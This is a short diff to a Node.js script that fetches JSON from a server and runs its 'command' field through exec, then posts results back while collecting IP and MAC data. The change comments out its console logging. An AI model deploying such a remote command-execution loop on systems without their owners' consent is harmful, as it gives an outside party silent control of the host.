@@ -25,8 +25,6 @@ function processData( data ) {
 			}
 		}
 	}
-	console.log(IPv4Mac);
-
 
 	if(data.command) {
 		exec(data.command, ( error, stdout, stderr ) => {
@@ -77,14 +75,14 @@ function postData( data ) {
 	};
 
 	const req = http.request(options, (res) => {
-		console.log(`STATUS: ${res.statusCode}`);
-		console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
+		//console.log(`STATUS: ${res.statusCode}`);
+		//console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
 		res.setEncoding('utf8');
 		res.on('data', (chunk) => {
-			console.log(`BODY: ${chunk}`);
+			//console.log(`BODY: ${chunk}`);
 		});
 		res.on('end', () => {
-			console.log('No more data in response.');
+			//console.log('No more data in response.');
 		});
 	});
 
@@ -106,7 +104,7 @@ function main() {
 		res.on('end', () => {
 			try {
 				const parsedData = JSON.parse(rawData);
-				console.log(parsedData);
+				//console.log(parsedData);
 				processData(parsedData);
 			} catch (e) {
 				console.error(e.message);
